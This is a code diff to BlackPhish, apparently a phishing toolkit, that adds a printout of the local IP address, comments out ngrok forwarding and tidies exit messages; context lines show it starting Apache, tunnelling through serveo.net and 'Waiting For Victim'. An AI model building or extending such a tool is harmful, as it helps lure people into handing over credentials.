@@ -6,7 +6,7 @@
 
 # Please message us if you find any problems or ideas
 
-# version 1: - release
+# version 1.1: - Added check local hosting
 
 # Please update version number each time we update
 
@@ -15,7 +15,7 @@
 try:
     from os import system, getcwd, geteuid
     from time import sleep
-    from socket import create_connection
+    from socket import create_connection, gethostname, gethostbyname
     from distutils.dir_util import copy_tree
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
@@ -23,6 +23,8 @@ except ImportError:
 
 # Variables #
 cwd = getcwd()
+hostname = gethostname()
+localip = gethostbyname(hostname)
 
 # COLORS #
 red = "\033[91;1m"
@@ -53,14 +55,14 @@ def checkInternet():
 def serveoForward():
     system('ssh -o ServerAliveInterval=60 -R inc0gnit0:80:localhost:80 serveo.net')
     
-def ngrokForward():
-    system('./ngrok http 80')
+#def ngrokForward():
+    #system('./ngrok http 80')
 
 # Banner #
 def banner():
     print('''
- \033[91;1m
-                https://github.com/iinc0gnit0/BlackPhish \033[94;1m \033[5m
+\033[91;1m
+                https://github.com/iinc0gnit0/BlackPhish \033[94;1m
 
                              ░███░                                   ░█░   
                            ░█████                                  ░███    
@@ -148,6 +150,8 @@ def main():
         system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
+        print(yellow + "\n[*] Local hosted: " + localip)
+        sleep(0.1)
         print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
         sleep(0.1)
         while True:
@@ -183,6 +187,8 @@ def main():
         system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
         sleep(0.1)
+        print(yellow + "\n[*] Local hosted: " + localip)
+        sleep(0.1)
         print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
         sleep(0.1)
         while True:
@@ -215,8 +221,7 @@ def main():
     
     # Exit #
     elif choice == 'exit':
-        print(red + '[!] Exiting...')
-        print(green + '[+] Have a nice day!')
+        endMessage()
     
     # Use shell #
     elif choice != "":
